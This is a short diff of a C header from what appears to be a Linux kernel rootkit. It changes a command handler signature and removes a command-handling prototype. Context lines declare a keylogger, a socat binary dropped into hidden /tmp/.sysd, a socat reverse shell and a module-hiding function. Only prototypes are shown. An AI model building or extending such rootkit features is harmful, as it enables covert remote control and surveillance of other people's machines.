@@ -32,7 +32,7 @@ struct command {
     unsigned cmd_name_size;
     char *cmd_desc;
     unsigned cmd_desc_size;
-    int (*cmd_handler)(char *args);
+    int (*cmd_handler)(char *args, enum Protocol protocol);
 };
 
 // Function prototypes
@@ -49,9 +49,6 @@ int epikeylog_exit(void);									// Cleanup function for the keylogger
 int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
 int remove_socat_binaire(void);								// Remove the socat binary from /tmp/.sysd
 int launch_reverse_shell(char *args);						// Launch the reverse shell with socat
-
-// rootkit_command.c
-int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
 
 // hider.c
 int hide_module(void);										// Hide the module from the kernel
